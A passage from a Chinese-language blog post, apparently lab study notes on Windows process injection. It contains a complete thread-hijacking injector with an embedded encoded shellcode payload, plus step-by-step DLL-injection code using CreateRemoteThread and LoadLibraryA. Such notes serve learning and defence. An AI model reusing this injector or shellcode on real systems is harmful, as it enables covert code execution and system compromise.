<span class="line"><span style="color: #7F848E; font-style: italic">// 获取线程上下文</span></span>
<span class="line"><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(hThread, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">context);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 修改 CONTEXT 结构体变量让 RIP 指向我们分配并且写入好的内存区域</span></span>
<span class="line"><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Rip</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DWORD_PTR)remoteBuffer; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 设置线程的上下文</span></span>
<span class="line"><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(hThread,</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">context);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 让线程继续运行</span></span>
<span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(hThread);</span></span></code></pre></div></div></figure>
<h3 id="实战-2">实战</h3>
<p>这个给的 Demo 就是修改 RIP 的，所以直接劫持 x64 应用就 OK。当然 shellcode 也要换一下，下面是我改好的代码。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;dbghelp.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;tlhelp32.h&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xff\xff\xff\x48\xbb\x53\x60\x16\x71\x23\x14\xed\xcc\x48</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xaf\x28\x95</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x95\xd3\xfc\x2d\xcc\x53\x60\x57\x20\x62\x44\xbf\x9d\x05</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x28\x27\xa3\x46\x5c\x66\x9e\x33\x28\x9d\x23\x3b\x5c\x66</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x9e\x73\x28\x9d\x03\x73\x5c\xe2\x7b\x19\x2a\x5b\x40\xea</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\xdc\x0c\xff\x5c\x77\x0d\x21\x38\xcd\x8d\x92\xa9\x1b</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x30\x22\xd5\x0f\x21\x01\x21\x47\x39\xa8\x46\xcd\x47\x11</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\x5e\x70\xf3\x9f\x6d\x44\x53\x60\x16\x39\xa6\xd4\x99</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xab\x1b\x61\xc6\x21\xa8\x5c\xf5\x88\xd8\x20\x36\x38\x22</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xc4\x0e\x9a\x1b\x9f\xdf\x30\xa8\x20\x65\x84\x52\xb6\x5b</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x40\xea\x5c\xdc\x0c\xff\x21\xd7\xb8\x2e\x55\xec\x0d\x6b</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x80\x63\x80\x6f\x17\xa1\xe8\x5b\x25\x2f\xa0\x56\xcc\xb5</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x88\xd8\x20\x32\x38\x22\xc4\x8b\x8d\xd8\x6c\x5e\x35\xa8</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x54\xf1\x85\x52\xb0\x57\xfa\x27\x9c\xa5\xcd\x83\x21\x4e</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x30\x7b\x4a\xb4\x96\x12\x38\x57\x28\x62\x4e\xa5\x4f\xbf</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x40\x57\x23\xdc\xf4\xb5\x8d\x0a\x3a\x5e\xfa\x31\xfd\xba</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x33\xac\x9f\x4b\x39\x99\x15\xed\xcc\x53\x60\x16\x71\x23</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x5c\x60\x41\x52\x61\x16\x71\x62\xae\xdc\x47\x3c\xe7\xe9</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\xa4\x98\xe4\x58\x6e\x05\x21\xac\xd7\xb6\xa9\x70\x33\x86</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x28\x95\xb5\x0b\x28\xeb\xb0\x59\xe0\xed\x91\x56\x11\x56</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x8b\x40\x12\x79\x1b\x23\x4d\xac\x45\x89\x9f\xc3\x12\x42</span><span style="color: #98C379">&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x78\x8e\xcc</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    THREADENTRY32 threadEntry;</span></span>
<span class="line"><span style="color: #ABB2BF">    CONTEXT context;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ContextFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> CONTEXT_FULL;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(THREADENTRY32);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE h_process </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span>
<span class="line"><span style="color: #ABB2BF">    PVOID b_shellcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(h_process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(h_process, b_shellcode, shellcode, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE h_snapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(TH32CS_SNAPTHREAD, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">Thread32First</span><span style="color: #ABB2BF">(h_snapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">threadEntry);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">do</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32OwnerProcessID</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])))</span></span>
<span class="line"><span style="color: #ABB2BF">        {</span></span>
<span class="line"><span style="color: #ABB2BF">            h_thread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenThread</span><span style="color: #ABB2BF">(THREAD_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ThreadID</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Thread32Next</span><span style="color: #ABB2BF">(h_snapshot, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">threadEntry));</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (h_thread)</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">SuspendThread</span><span style="color: #ABB2BF">(h_thread);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(h_thread, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">context);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Rip</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (DWORD_PTR)b_shellcode;</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(h_thread, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">context);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(h_thread);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Inject Success!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">else</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Thread Not Found!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h2 id="Abusing-DLLs-滥用-DLL">Abusing DLLs 滥用 DLL</h2>
<p>DLL 注入可以分为6个步骤：</p>
<ol>
<li>找到要注入的目标进程。</li>
<li>打开目标进程。</li>
<li>为恶意 DLL 分配内存区域。</li>
<li>将恶意 DLL 写入分配的内存。</li>
<li>加载并执行恶意 DLL。</li>
</ol>
<p>在 DLL 注入的第一步，我们必须找到一个目标线程。可以使用三个 Windows API 调用从进程中找到一个线程：<code>CreateToolhelp32Snapshot()</code> 、 <code>Process32First()</code> 和 <code>Process32Next()</code>，这个和上一节中是一样的，不过是通过遍历线程了。<code>Thread32</code> 和 <code>Process32</code> 的区别。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">DWORD</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">processName</span><span style="color: #ABB2BF">){</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 打快照</span></span>
<span class="line"><span style="color: #ABB2BF">    HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">        TH32CS_SNAPPROCESS,</span><span style="color: #7F848E; font-style: italic"> // 快照系统中的所有线程</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (hSnapshot){</span></span>
<span class="line"><span style="color: #ABB2BF">        PROCESSENTRY32 entry;</span><span style="color: #7F848E; font-style: italic">                  // 创建 PROCESSENTRY32 结构体指针</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwSize</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PROCESSENTRY32);</span><span style="color: #7F848E; font-style: italic"> // 预先设置结构体的大小</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">entry)){</span></span>
<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">                // 从结构体指针里面取出进程名和提供的进程名进行比对</span></span>
<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">strcmp</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">szExeFile</span><span style="color: #ABB2BF">, processName)){</span></span>
<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ProcessID</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic"> // 返回比对成功的 PID</span></span>
<span class="line"><span style="color: #ABB2BF">                }</span></span>
<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF">(hSnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">entry)); </span></span>
<span class="line"><span style="color: #ABB2BF">        }</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 存储进程 PID</span></span>
<span class="line"><span style="color: #ABB2BF">DWORD processId </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">getProcessId</span><span style="color: #ABB2BF">(processName);</span></span></code></pre></div></div></figure>
<p>第二步，枚举出 PID 后，我们需要打开进程。这可以通过多种 Windows API 调用实现： <code>GetModuleHandle</code> 、 <code>GetProcAddress</code> 或 <code>OpenProcess</code> 。</p>
<p>第三步，必须为提供的恶意 DLL 分配内存。与大多数注入器一样，这可以通过 <code>VirtualAllocEx</code> 来完成。</p>
<p>第四步，我们需要将恶意 DLL 写入已分配的内存位置。我们可以使用 <code>WriteProcessMemory</code> 来写入已分配的区域。</p>
<p>这里我不太理解为什么前面分配内存的时候不 + 1，按理说分配的大小要超过能写入的大小吧，这里写入的大小都超过分配内存区域的大小了，难道不报错？</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 通过 PID 获取进程的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, processId);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 在目标进程的地址空间中给 DLL 分配内存，返回一个指针地址</span></span>
<span class="line"><span style="color: #ABB2BF">LPVOID dllAllocatedMemory </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath),</span><span style="color: #7F848E; font-style: italic"> // DLL 路径文本本身的大小</span></span>
<span class="line"><span style="color: #ABB2BF">	MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT, PAGE_EXECUTE_READWRITE</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 写入内存</span></span>
<span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hProcess,</span></span>
<span class="line"><span style="color: #ABB2BF">	dllAllocatedMemory,</span><span style="color: #7F848E; font-style: italic"> // 分配内存区域的指针</span></span>
<span class="line"><span style="color: #ABB2BF">	dllLibFullPath,</span><span style="color: #7F848E; font-style: italic"> // 恶意 DLL 的路径</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">strlen</span><span style="color: #ABB2BF">(dllLibFullPath) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 确保字符后面的 \0 也写入进去</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>最后，我们使用 <code>CreateRemoteThread</code> 在目标进程中创建一个新线程。该线程的<strong>起始地址</strong>指向 <code>kernel32.dll</code> 中的 <code>LoadLibraryA</code> 函数，并将我们写入的 DLL 路径作为<strong>参数</strong>传递给它。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">LPVOID loadLibrary </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (LPVOID) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">GetModuleHandle</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 包含需要调用的 API 的模块的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #98C379">&quot;LoadLibraryA&quot;</span><span style="color: #7F848E; font-style: italic"> // 要导入的 API 调用</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">HANDLE remoteThreadHandler </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hProcess, 	</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 使用线程的默认堆栈大小</span></span>
<span class="line"><span style="color: #ABB2BF">	(LPTHREAD_START_ROUTINE) loadLibrary</span><span style="color: #7F848E; font-style: italic"> // 指向 API 起始函数的指针</span></span>
<span class="line"><span style="color: #ABB2BF">	dllAllocatedMemory,</span><span style="color: #7F848E; font-style: italic"> // 指向分配好内存区域的指针</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 创建后立即执行</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h3 id="实践">实践</h3>
<p>说实话有点折腾人了，这里由于 ANSI 和 Unicode 的问题弄了很久。两套兼容方式也够折磨人的，不愧是 <s>Microshit</s>。</p>
<p>前面 <code>GetProcessId</code> 方法那里，<code>Process32First</code> 只给了一种实现，用的是 Unicode 编码，即 <code>wchar_t</code> 类型。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#ifdef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">UNICODE</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Process32First</span><span style="color: #ABB2BF"> Process32FirstW</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Process32Next</span><span style="color: #ABB2BF"> Process32NextW</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PROCESSENTRY32</span><span style="color: #ABB2BF"> PROCESSENTRY32W</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">PPROCESSENTRY32</span><span style="color: #ABB2BF"> PPROCESSENTRY32W</span></span>
<span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LPPROCESSENTRY32</span><span style="color: #ABB2BF"> LPPROCESSENTRY32W</span></span>
<span class="line"><span style="color: #C678DD">#endif</span><span style="color: #7F848E; font-style: italic">  // !UNICODE</span></span></code></pre></div></div></figure>
<p>从内存视图里面可以看到从结构体里面获取的字符串都高位有一个 \00，这是 UTF-16 的特性。而我们传入的 <code>processName</code> 又是 ANSI 编码的，这就会导致 strcmp 返回不了正确的结果。</p>
